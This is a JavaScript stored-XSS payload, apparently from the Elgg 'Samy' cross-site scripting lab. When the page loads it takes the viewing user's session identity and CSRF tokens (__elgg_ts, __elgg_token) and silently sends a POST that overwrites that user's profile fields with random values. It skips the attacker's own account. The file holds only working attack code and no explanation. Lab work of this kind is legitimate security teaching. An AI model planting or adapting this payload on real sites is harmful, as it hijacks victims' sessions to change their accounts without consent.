function randomString(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {result += characters.charAt(Math.floor(Math.random() * charactersLength));}
    return result;
}

window.onload = function () {
    var name = elgg.session.user.name;
    var guid = "&guid="+elgg.session.user.guid;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    var briefDesc = "&briefdescription="+randomString(10)+"&accesslevel[briefdescription]=1";
    var description = "&description="+1605011+"&accesslevel[description]=1";
    var contactemail = "&contactemail="+randomString(10)+"&accesslevel[contactemail]=1";
    var interests = "&interests="+randomString(10)+"&accesslevel[interests]=1";
    var location = "&location="+randomString(10)+"&accesslevel[location]=1";
    var mobile = "&mobile="+randomString(10)+"&accesslevel[mobile]=1";
    var phone = "&phone="+randomString(10)+"&accesslevel[phone]=1";
    var skills = "&skills="+randomString(10)+"&accesslevel[skills]=1";
    var twitter = "&twitter="+randomString(10)+"&accesslevel[twitter]=1";
    var website = "&website="+randomString(10)+"&accesslevel[website]=1";

    var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
    var content = name + guid + ts + token + briefDesc + description + contactemail + interests + location + mobile + phone + skills + twitter + website;
    
    var samyGuid = 47;

    if (elgg.session.user.guid != samyGuid) {
        var Ajax = null;
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
}
